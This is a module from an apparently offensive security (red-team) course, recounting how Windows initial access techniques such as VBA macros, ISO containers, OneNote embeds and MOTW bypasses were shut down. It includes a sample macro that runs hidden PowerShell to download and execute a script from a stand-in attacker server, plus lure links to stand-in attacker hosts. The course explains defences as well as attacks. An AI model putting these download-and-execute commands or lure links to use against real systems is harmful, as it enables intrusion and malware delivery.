# Module 02: A History of What Died and Why

Every initial access technique you see on YouTube tutorials from 2020 is dead. If you try them on a modern Windows 11 endpoint in 2026, they will fail, get blocked, or get you caught instantly.

This module walks through the graveyard. For each dead technique, you will learn:
- **What it was:** How attackers actually used it
- **Why it worked:** The trust boundary or gap it exploited
- **What killed it:** The patch, policy, or design change that shut it down
- **The lesson:** What the death of each technique teaches about the cat-and-mouse game

Understanding this history is not optional. It prevents you from wasting time on dead paths and teaches you the *patterns* that Microsoft follows when killing techniques -- so you can predict what will die next.

**Time required:** 1-2 hours (reading and discussion -- no hands-on labs in this module)

---

## Table of Contents

- [Part 1: The Golden Age of VBA Macros (Died 2022)](#part-1-the-golden-age-of-vba-macros-died-2022)
- [Part 2: The Container Era -- ISO, VHD, and IMG (Died 2022-2023)](#part-2-the-container-era----iso-vhd-and-img-died-2022-2023)
- [Part 3: The OneNote Spike (Died 2023)](#part-3-the-onenote-spike-died-2023)
- [Part 4: LNK Stomping and MOTW Bypass CVEs (Died 2024)](#part-4-lnk-stomping-and-motw-bypass-cves-died-2024)
- [Part 5: MSI and MSIX Abuse (Died 2024-2025)](#part-5-msi-and-msix-abuse-died-2024-2025)
- [Part 6: Windows Themes and Search Protocol Abuse (Died 2024)](#part-6-windows-themes-and-search-protocol-abuse-died-2024)
- [Part 7: The Complete Timeline](#part-7-the-complete-timeline)
- [Part 8: What Survived and Why](#part-8-what-survived-and-why)

---

## Part 1: The Golden Age of VBA Macros (Died 2022)

### 1.1 What It Was

For nearly **two decades** (2000-2022), VBA macros in Microsoft Office documents were the single most popular initial access technique on the planet. Every red team, every APT group, every cybercriminal gang used them.

The attack looked like this:

```
Step 1: Attacker creates a Word document (.docm) or Excel spreadsheet (.xlsm)
Step 2: Attacker writes VBA macro code inside the document
Step 3: Macro code does something malicious:
        - Downloads a payload from the internet
        - Runs PowerShell commands
        - Creates files on disk
        - Connects back to a C2 server
Step 4: Attacker emails the document to the victim
Step 5: Victim opens the document in Microsoft Word/Excel
Step 6: Office shows a yellow banner: "SECURITY WARNING: Macros have been disabled"
Step 7: Victim clicks "Enable Content"
Step 8: Macro runs. Game over.
```

### 1.2 Why It Worked So Well

VBA macros were the perfect attack vector for multiple reasons:

**Reason 1: Office is everywhere.** Every enterprise on earth uses Microsoft Office. The file types (.docx, .xlsx) are universally trusted. Email gateways could not block Office documents without breaking business operations.

**Reason 2: Social engineering was trivial.** Attackers disguised macros as invoices, purchase orders, resumes, and shipping notifications. The yellow "Enable Content" banner was so common that most users clicked it without thinking. Many organizations even had internal documents that required macros, training users to click "Enable Content" habitually.

**Reason 3: VBA had full system access.** Once a macro ran, it had the same permissions as the user. It could:
- Run any program on the system (`Shell("powershell.exe ...")`)
- Read and write files anywhere the user could
- Access the network
- Download files from the internet
- Create scheduled tasks for persistence

**Reason 4: Obfuscation was easy.** VBA code could be obfuscated with string manipulation, environment variable abuse, and dynamic code construction. Antivirus products struggled to detect novel macro payloads.

### 1.3 A Typical Macro Attack (What It Actually Looked Like)

Here is a simplified example of what a malicious macro did (this is educational -- these techniques are completely dead now):

```vba
Sub AutoOpen()
    ' AutoOpen() runs automatically when the document is opened
    ' and the user clicks "Enable Content"

    Dim cmd As String
    ' Build a PowerShell command that downloads and executes a payload
    cmd = "powershell.exe -w hidden -ep bypass -c "
    cmd = cmd & """IEX(New-Object Net.WebClient).DownloadString("
    cmd = cmd & "'http://attacker-server.com/payload.ps1')"""

    ' Execute the command
    Shell cmd, vbHide
End Sub
```

When the victim opened the document and clicked "Enable Content":
1. `AutoOpen()` fired automatically
2. It built a PowerShell command string
3. `Shell` executed PowerShell in a hidden window
4. PowerShell downloaded and executed a script from the attacker's server
5. The victim saw nothing -- the document looked normal

### 1.4 What Killed It

**February 2022: Microsoft announced the death sentence.**

Microsoft declared that VBA macros in Office documents downloaded from the internet (i.e., files with MOTW / `ZoneId=3`) would be **blocked by default**. No more yellow "Enable Content" banner. Instead, users would see a red banner with no enable button:

```
SECURITY RISK: Microsoft has blocked macros from running because the
source of this file is untrusted.
```

The rollout was bumpy (Microsoft temporarily reversed the change in July 2022 due to backlash, then re-enabled the block permanently in late 2022), but by early 2023, macro blocking was universal across Office 365 and Office 2021+.

**Why this was a killshot:**

The entire macro attack chain depended on one thing: the user clicking "Enable Content." Microsoft removed that button entirely for internet-sourced documents. There was no user override. The macros simply could not run.

### 1.5 How Attackers Tried to Adapt

Attackers did not give up immediately. They tried several workarounds:

| Workaround | How It Worked | Why It Also Died |
|:-----------|:-------------|:-----------------|
| **"Unblock the file" instructions** | Told users to right-click the file > Properties > check "Unblock" | Too many steps. Most users would not do it. Social engineering success rate dropped drastically. |
| **Template injection** | Document loads a remote .dotm template containing macros | Microsoft extended the block to remotely loaded templates. |
| **Mark-of-the-Web stripping** | Deliver the document inside a container (ISO/ZIP) to strip MOTW | This shifted the attack to container abuse (see Part 2). The document itself was fine, but the delivery chain changed. |

### 1.6 The Lesson

> **Macros died because Microsoft removed the user's ability to make a bad decision.** The "Enable Content" button was the weakest link -- not the macro technology itself. When Microsoft eliminated the choice, the entire attack surface collapsed overnight.

This is the pattern you will see repeated: **Microsoft does not fix the technology. They remove the user interaction that enables the attack.**

---

## Part 2: The Container Era -- ISO, VHD, and IMG (Died 2022-2023)

### 2.1 What It Was

When macros died, attackers needed a new way to deliver malicious files that could bypass MOTW (since MOTW is what triggers SmartScreen, Protected View, and macro blocking). They found it in **container formats** -- specifically ISO, VHD, and IMG files.

The attack looked like this:

```
Step 1: Attacker creates a malicious payload (e.g., a .lnk shortcut
        that runs a hidden script, or a .exe disguised with a document icon)
Step 2: Attacker packages the payload inside an ISO, VHD, or IMG file
Step 3: Attacker delivers the container to the victim (via email,
        cloud link, or HTML smuggling)
Step 4: Victim double-clicks the ISO/VHD/IMG file
Step 5: Windows MOUNTS the container as a virtual drive (e.g., D:\ or E:\)
Step 6: Victim sees the contents and double-clicks the payload inside
Step 7: The payload runs WITHOUT SmartScreen warnings
        because the files inside the container DO NOT have MOTW
```

### 2.2 Why It Worked

This technique exploited a fundamental gap in how Windows handled MOTW propagation:

**The gap:** When you download an ISO file from the internet, the ISO file itself gets tagged with MOTW (`ZoneId=3`). But when Windows mounts the ISO as a virtual drive, the files **inside** the ISO do not inherit the MOTW tag. Windows treats the mounted drive like a local disk, and local files are trusted.

```
Download from internet:
  invoice.iso  -->  ZoneId=3  (MOTW applied to the container)

User double-clicks invoice.iso:
  Windows mounts it as drive D:\

Files inside the mounted drive:
  D:\invoice.lnk  -->  No MOTW!  (Windows treats it as a local file)
  D:\payload.dll   -->  No MOTW!
```

**The result:** SmartScreen did not check the files. Protected View did not activate. Macros (if any) were not blocked. The entire defense stack that depends on MOTW was bypassed.

### 2.3 Why ISO Files Were Particularly Dangerous

ISO files had several properties that made them perfect for attacks:

1. **Windows can mount them natively.** Since Windows 8, double-clicking an ISO file automatically mounts it as a virtual drive. No third-party software needed.

2. **They look professional.** An ISO file named `Q4_Financial_Report.iso` or `Software_Update_v3.2.iso` does not look suspicious to most users.

3. **Email gateways were slow to block them.** In 2022, many gateways did not block ISO attachments because legitimate software distribution sometimes used ISO files.

4. **They could contain hidden files.** Attackers would put a visible `.lnk` shortcut (disguised with a PDF or Word icon) alongside a hidden `.dll` or `.exe`. The user would see what looked like a normal document but was actually a shortcut that executed the hidden payload.

### 2.4 A Typical ISO Attack Chain

```
invoice.iso (downloaded from email link, has MOTW)
  |
  +-- [visible] Invoice_Q4_2023.lnk  (icon looks like a PDF file)
  |       |
  |       +-- Target: rundll32.exe payload.dll,Start
  |
  +-- [hidden] payload.dll  (the actual malicious code)
```

The victim's experience:
1. Receives email: "Please review the attached invoice"
2. Downloads `invoice.iso`
3. Double-clicks it -- Windows mounts it as `D:\`
4. Sees what looks like a PDF file called "Invoice_Q4_2023"
5. Double-clicks it -- but it is actually a `.lnk` shortcut
6. The shortcut runs `rundll32.exe payload.dll,Start`
7. The payload executes with no MOTW checks, no SmartScreen, no warnings

### 2.5 What Killed It

Microsoft rolled out fixes in two waves:

**Wave 1 (November 2022 -- Patch Tuesday):**
Microsoft patched Windows so that when an ISO/VHD/IMG file that has MOTW is mounted, the files inside the mounted volume **inherit the MOTW tag**. This meant:
- Files extracted from a downloaded ISO now had `ZoneId=3`
- SmartScreen checked them
- Protected View activated for Office documents inside
- Macro blocking applied

**Wave 2 (2023 -- Email gateway updates):**
Major email gateways (Microsoft Defender for Office 365, Proofpoint, Mimecast) added ISO, VHD, and IMG to their **default block lists**. These file types could no longer be delivered via email at all.

### 2.6 The Lesson

> **Container bypass died because Microsoft fixed MOTW propagation.** The core vulnerability was not in the container format itself -- it was in the failure to propagate trust metadata (MOTW) across a trust boundary (from the container to its contents). Once Microsoft ensured MOTW propagated into mounted volumes, the entire technique collapsed.

This teaches an important principle: **when Microsoft fixes a trust propagation gap, every technique that depended on that gap dies simultaneously.**

---

## Part 3: The OneNote Spike (Died 2023)

### 3.1 What It Was

After macros died and ISO containers were patched, attackers had a brief window where they discovered **Microsoft OneNote** as a delivery vector. This was creative and unexpected.

OneNote documents (`.one` files) had a unique property: they could contain **embedded file attachments**. Unlike Word or Excel, OneNote was not subject to the macro blocking policy. And unlike ISO files, OneNote attachments were not yet on email gateway block lists.

The attack looked like this:

```
Step 1: Attacker creates a OneNote document (.one file)
Step 2: Attacker embeds a malicious file inside the document
        (a .bat script, .hta file, or .vbs script)
Step 3: Attacker places a large image OVER the embedded file
        that says "Double-click here to view the document"
Step 4: Victim opens the OneNote file
Step 5: Victim sees what looks like a button saying "click to view"
Step 6: Victim double-clicks -- they are actually clicking the
        embedded malicious file hidden behind the image
Step 7: OneNote shows a warning: "This file might harm your computer"
Step 8: Victim clicks OK
Step 9: The embedded script runs
```

### 3.2 Why It Worked (Briefly)

1. **OneNote was a blind spot.** Security teams focused on Word, Excel, and PowerPoint. Nobody thought about OneNote as an attack vector because it had never been one before.

2. **The embedded files ran with reduced scrutiny.** OneNote's embedded file warning was a simple dialog box -- much weaker than SmartScreen or the macro block banner.

3. **Email gateways did not block .one files.** OneNote documents were considered benign by every email filter.

4. **The visual trick was effective.** Placing a large "Click to view" image over the embedded file was simple but convincing.

### 3.3 What Killed It

Microsoft responded fast -- within about 4 months of widespread abuse:

**April 2023:** Microsoft released an update that **blocked embedded files with dangerous extensions** inside OneNote documents. The blocked extensions included `.exe`, `.bat`, `.cmd`, `.vbs`, `.js`, `.wsf`, `.hta`, `.scr`, and dozens more.

After this patch, if a OneNote document contained an embedded `.bat` or `.hta` file, OneNote would refuse to execute it entirely. No user override.

Additionally, email gateways added `.one` files to their suspicious/blocked attachment lists.

### 3.4 The Lesson

> **OneNote abuse died because it was a single-vector trick with an obvious fix.** Microsoft simply blocked dangerous file types from being embedded. The technique had no fallback -- once the embedding was blocked, there was nothing else to exploit in OneNote.

This teaches another pattern: **techniques that depend on a single overlooked feature die fast once they get attention.** The more creative and unexpected a technique is, the shorter its lifespan tends to be, because Microsoft prioritizes fixing things that make headlines.

---

## Part 4: LNK Stomping and MOTW Bypass CVEs (Died 2024)

### 4.1 What LNK Stomping Was

This was a more sophisticated technique. Instead of using container formats to strip MOTW, attackers found ways to **corrupt or manipulate the MOTW metadata itself** so that Windows would ignore it.

**CVE-2024-21412 (February 2024):** This was the big one. Researchers discovered that Windows shortcut files (`.lnk` files) could be crafted in a specific way that caused Windows Explorer to skip the SmartScreen check entirely, even though the file had MOTW.

The trick: the `.lnk` file pointed to a target path that contained a **space followed by a dot** in a specific position. This caused the Windows Shell to misparse the path and skip the security zone check.

```
Normal LNK target:
  C:\Users\victim\Downloads\payload.exe
  --> SmartScreen checks this (MOTW present)

"Stomped" LNK target:
  C:\Users\victim\Downloads\payload.exe .
  --> Windows Shell misparsed this path
  --> SmartScreen check was SKIPPED
  --> Payload ran without any warning
```

### 4.2 How It Was Used in the Wild

This CVE was actively exploited by APT groups (notably the Water Hydra / DarkCasino group) before Microsoft patched it. The attack chain was:

```
Step 1: Victim receives a link (via email or messaging) pointing to
        an attacker-controlled WebDAV or SMB share
Step 2: The share contains a crafted .lnk file
Step 3: The .lnk file uses the path-stomping trick
Step 4: When executed, SmartScreen does not fire
Step 5: The payload runs silently
```

### 4.3 Other MOTW Bypass CVEs

CVE-2024-21412 was not alone. Several other MOTW-related CVEs were discovered and patched around the same time:

| CVE | Date | What It Bypassed | How |
|:----|:-----|:-----------------|:----|
| **CVE-2022-44698** | Dec 2022 | SmartScreen / MOTW | Malformed Authenticode signatures caused SmartScreen to crash and fail-open |
| **CVE-2023-24880** | Mar 2023 | SmartScreen | Incomplete fix for CVE-2022-44698 -- attackers found a variant |
| **CVE-2023-36025** | Nov 2023 | SmartScreen | Crafted `.url` (Internet Shortcut) files bypassed SmartScreen entirely |
| **CVE-2024-21412** | Feb 2024 | SmartScreen / MOTW | LNK path stomping as described above |
| **CVE-2024-38213** | Aug 2024 | SmartScreen / MOTW | Another SmartScreen bypass via `copy /b` technique on `.lnk` files |

### 4.4 What Killed Them

Each CVE was patched individually via Windows security updates (Patch Tuesday). But more importantly, Microsoft made **architectural changes** to how SmartScreen processes files:

- SmartScreen's zone checking became more resilient to malformed inputs
- The Shell's path parsing was hardened against manipulation
- MOTW validation was moved earlier in the execution chain so that bypasses had fewer attack surfaces

### 4.5 The Lesson

> **CVE-based MOTW bypasses die when the specific bug is patched.** Unlike technique categories (like "container abuse"), individual CVEs have a fixed lifespan: they work from discovery until the patch is deployed. Professional red teams cannot build reliable tradecraft on unpatched CVEs because the window is too short and unpredictable.

The deeper lesson: **SmartScreen and MOTW are hardening targets.** Each bypass that gets discovered and patched makes the next bypass harder to find. Microsoft is actively investing in making MOTW unkillable.

---

## Part 5: MSI and MSIX Abuse (Died 2024-2025)

### 5.1 What It Was

**MSI (Windows Installer) abuse** was a technique where attackers delivered malicious `.msi` installer packages instead of `.exe` files. MSI files had several advantages:

1. **They looked legitimate.** Enterprise software is commonly distributed as `.msi` packages. Users and IT staff were trained to trust them.
2. **They could run with elevated privileges.** If the MSI was configured correctly, Windows would prompt for admin credentials via UAC, and users would provide them because "it's an installer."
3. **They could execute arbitrary code.** MSI packages support "Custom Actions" -- embedded scripts or executables that run during installation.

**MSIX** was a newer packaging format from Microsoft. In 2023-2024, attackers abused the `ms-appinstaller://` protocol handler to trick users into installing malicious MSIX packages directly from web URLs. The victim would click a link, and Windows would show an "App Installer" dialog that looked like a legitimate Microsoft Store installation.

### 5.2 How MSIX Protocol Abuse Worked

```
Step 1: Attacker hosts a malicious MSIX package on a web server
Step 2: Attacker creates a link: ms-appinstaller://?source=https://evil.com/app.msix
Step 3: Victim clicks the link (from email, Teams, or a website)
Step 4: Windows opens the App Installer UI
Step 5: The UI shows the app name, publisher, and icon (all controlled by attacker)
Step 6: Victim clicks "Install"
Step 7: Malicious app is installed and runs
```

The App Installer UI looked trustworthy -- it resembled a Microsoft Store installation, complete with a publisher name and app icon that the attacker could customize.

### 5.3 What Killed It

**December 2023:** Microsoft **disabled the `ms-appinstaller` protocol handler by default.** This meant clicking an `ms-appinstaller://` link no longer opened the App Installer UI. Users could no longer be tricked into installing MSIX packages from web URLs.

**2024-2025:** Email gateways added MSI and MSIX to their blocked attachment lists. Windows Defender added specific detections for malicious MSI Custom Actions. SmartScreen's reputation system began flagging unknown MSI files more aggressively.

### 5.4 The Lesson

> **Protocol handler abuse dies when Microsoft disables the handler.** The `ms-appinstaller` attack was elegant because it used a legitimate Windows feature. But that also made it easy to kill -- Microsoft just flipped a switch and disabled the protocol. Any technique that depends on a single protocol handler or URI scheme is vulnerable to this kind of instant kill.

---

## Part 6: Windows Themes and Search Protocol Abuse (Died 2024)

### 6.1 Windows Themes Abuse

**What it was:** Windows theme files (`.theme` and `.themepack`) are configuration files that change the desktop wallpaper, colors, and sounds. Attackers discovered that theme files could include a `[DesktopWallpaper]` value pointing to a remote UNC path (like `\\attacker-server\share\wallpaper.jpg`). When the user applied the theme, Windows would automatically connect to the attacker's server and send the user's NTLM authentication hash -- enabling credential theft.

**What killed it:** Microsoft patched theme files to block remote UNC paths. Additionally, NTLM relay protections were strengthened across Windows 11.

### 6.2 Search Protocol Abuse (search-ms://)

**What it was:** The `search-ms://` protocol handler opens Windows Search with specific parameters. Attackers crafted links like:

```
search-ms://query=invoice&crumb=location:%5C%5Cattacker.com%5Cshare
```

When a victim clicked this link (from a browser or Office document), Windows Search would open and display files from a **remote attacker-controlled server** as if they were local search results. The victim would see what looked like local files and double-click them, executing the attacker's payload.

**What killed it:** Microsoft restricted the `search-ms://` protocol handler so it could no longer point to remote network locations. Browser vendors also blocked navigation to `search-ms://` URIs from web pages.

### 6.3 The Lesson

> **Protocol and file-type abuse techniques have short lifespans.** Both theme files and `search-ms://` were creative abuses of legitimate Windows features. But because they relied on specific, narrow functionality, Microsoft could patch them surgically without breaking anything else. The narrower the technique, the easier the fix.

---

## Part 7: The Complete Timeline

Here is the full timeline of initial access evolution from 2022 to 2026:

```
2022
----
Feb   Microsoft announces VBA macro blocking for internet-sourced files
Jul   Microsoft temporarily reverses macro blocking (backlash from admins)
Oct   Microsoft re-enables macro blocking permanently
Oct   Attackers massively shift to ISO/VHD container delivery
Nov   Microsoft patches MOTW propagation into mounted ISO/VHD/IMG volumes
Dec   CVE-2022-44698: SmartScreen bypass via malformed signatures (patched)

2023
----
Jan   OneNote abuse spikes as attackers search for new vectors
Feb   Qakbot, Emotet, IcedID campaigns shift heavily to OneNote delivery
Mar   CVE-2023-24880: SmartScreen bypass variant (patched)
Apr   Microsoft blocks dangerous file types embedded in OneNote
Jun   Email gateways universally block ISO, VHD, IMG, ONE attachments
Nov   CVE-2023-36025: SmartScreen bypass via .url files (patched)
Dec   Microsoft disables ms-appinstaller protocol handler by default

2024
----
Feb   CVE-2024-21412: LNK Stomping SmartScreen bypass (patched)
Mar   search-ms:// protocol abuse patched
Jun   Windows theme file NTLM leak patched
Aug   CVE-2024-38213: Another SmartScreen bypass (patched)
Oct   Smart App Control improvements in Windows 11 24H2
Dec   MSIX effectively dead as an attack vector

2025
----
Jan   SmartScreen architectural hardening (fail-closed behavior)
Mar   Enhanced MOTW propagation for additional archive formats
Jun   Browser-level file type blocking expanded
Oct   SAC toggle flexibility added (can now re-enable after disabling)

2026
----
      The techniques covered in Modules 03-06 of this course represent
      what CURRENTLY works. Everything above is dead.
```

---

## Part 8: What Survived and Why

Looking at the graveyard, a clear pattern emerges. Techniques died for specific, predictable reasons. The techniques that survived share common traits.

### 8.1 Why Techniques Die

| Death Cause | Examples | Pattern |
|:-----------|:---------|:--------|
| **User choice removed** | VBA macros, OneNote embeds | Microsoft removes the "click to allow" option entirely |
| **Trust propagation fixed** | ISO/VHD MOTW bypass | MOTW now follows files across trust boundaries |
| **Protocol handler disabled** | ms-appinstaller, search-ms | Microsoft flips a switch and the protocol stops working |
| **Bug patched** | All SmartScreen CVEs | Individual vulnerabilities have a finite lifespan |
| **Gateway blocking** | ISO, VHD, ONE, MSI via email | File types added to universal block lists |

### 8.2 What Survived (Preview of Modules 03-06)

The techniques that survived the 2022-2026 purge share these traits:

**1. HTML Smuggling (Module 03)** survived because:
- The payload is assembled on the client side by JavaScript -- the email gateway only sees clean HTML
- There is no malicious file to block during transit
- MOTW is applied to the final assembled file, but the delivery mechanism itself cannot be blocked without breaking legitimate web applications

**2. LOLBINs (Module 04)** survived because:
- They are legitimate, signed Microsoft binaries that cannot be removed
- Blocking `certutil.exe` or `mshta.exe` would break legitimate IT operations
- Each LOLBIN is individually detectable, but there are dozens of them

**3. Social Engineering / Workflow Abuse (Module 05)** survived because:
- ClickFix/pastejacking exploits user behavior, not software vulnerabilities
- Teams and Slack are trusted communication channels that bypass email security
- QR codes move URLs out of the text layer where gateways scan
- These target human trust, not technical controls

**4. Identity-First Attacks (Module 06)** survived because:
- OAuth consent phishing uses legitimate Microsoft login pages
- Device code phishing abuses a real authentication flow
- Session theft steals cookies after legitimate authentication
- There is no "malicious file" to detect -- the attack IS the login

### 8.3 The Survival Rule

> **Techniques survive when they exploit fundamental design decisions that cannot be changed without breaking legitimate functionality.**

HTML smuggling works because JavaScript must be able to create files. LOLBINs work because enterprise IT needs those tools. Identity attacks work because OAuth must allow third-party apps. These are not bugs -- they are features that happen to have offensive applications.

The dead techniques all relied on **bugs, oversights, or weak defaults** that Microsoft could fix. The surviving techniques rely on **intentional design choices** that Microsoft cannot easily change.

---

## Summary

| Technique | Peak Usage | Death Date | Cause of Death | Lifespan |
|:----------|:-----------|:-----------|:---------------|:---------|
| VBA Macros | 2000-2022 | Feb 2022 | Macro blocking (no user override) | ~22 years |
| ISO/VHD/IMG Containers | Oct-Nov 2022 | Nov 2022 | MOTW propagation into mounted volumes | ~2 months |
| OneNote Embedded Files | Jan-Apr 2023 | Apr 2023 | Dangerous file type blocking in OneNote | ~4 months |
| SmartScreen CVEs | Various | Various | Individual patches | Days to weeks |
| MSIX App Installer | 2023 | Dec 2023 | ms-appinstaller protocol disabled | ~12 months |
| search-ms:// Abuse | 2023-2024 | Mar 2024 | Protocol handler restricted | ~6 months |
| LNK Stomping | Late 2023 | Feb 2024 | CVE-2024-21412 patched | ~3 months |
| Theme File NTLM Leak | 2023-2024 | Jun 2024 | Remote UNC paths blocked | ~8 months |

**Key takeaway:** Notice the trend in lifespan. VBA macros lasted 22 years. ISO containers lasted 2 months. Each successive technique has a shorter lifespan because Microsoft's response time is getting faster. This is why modern red teams need to understand the *principles* behind attacks, not just memorize specific techniques.

---

**Next module:** [03_browser_delivery_and_html_smuggling.md](03_browser_delivery_and_html_smuggling.md) -- The delivery technique that survived everything. You will build working HTML smuggling pages from scratch and observe the full detection chain.
